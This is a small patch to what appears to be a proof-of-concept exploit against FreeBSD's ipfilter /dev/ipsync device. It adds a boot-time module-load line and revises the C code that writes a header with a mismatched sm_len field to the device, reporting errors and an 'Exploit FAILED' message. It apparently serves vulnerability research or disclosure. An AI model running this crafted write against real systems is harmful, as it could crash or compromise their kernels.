@@ -15,6 +15,7 @@ Prerequisites
 -------------
 1. Host must have ipfilter kernel module loaded
 
+sysrc kld_list+="ipfilter"
 kldload ipfilter
 
 
@@ -58,10 +59,13 @@ int main() {
   header->sm_len = htonl(LEN - 100);
 
 
-  int error = write(fd, header, LEN);
-  perror("Write failed: ");
-  printf("error: %d\n", error);
-  printf("errno: %d\n", errno);
+  int wlen = write(fd, header, LEN);
+  if (wlen == -1) {
+    perror("Error writing to /dev/ipsync");
+    printf("errno: %d\n", errno);
+  }
+
+  printf("Exploit FAILED\n");
 
   close(fd);
   return 0;
